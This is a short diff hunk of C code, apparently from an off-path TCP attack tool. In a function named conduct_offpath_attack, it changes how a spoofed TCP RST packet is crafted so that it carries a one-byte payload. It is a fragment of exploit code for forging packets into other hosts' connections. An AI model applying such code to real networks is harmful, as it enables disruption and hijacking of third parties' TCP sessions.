@@ -392,7 +392,7 @@ int conduct_offpath_attack(void)
 	rst_pkt.len = 8192;
 	rst_pkt.buf = malloc(rst_pkt.len);
 	memcpy(rst_pkt.buf, ROUTER_MAC LOCAL_MAC "\x08\x00", g_ctx.ipoff);
-	if (!tcp_craft(rst_pkt.buf + g_ctx.ipoff, &rst_pkt.len, legit, TH_RST, NULL, 0))
+	if (!tcp_craft(rst_pkt.buf + g_ctx.ipoff, &rst_pkt.len, legit, TH_RST, "x", 1))
 		return 0;
 	rst_pkt.len += g_ctx.ipoff;
 	legit->seq = old_seq;
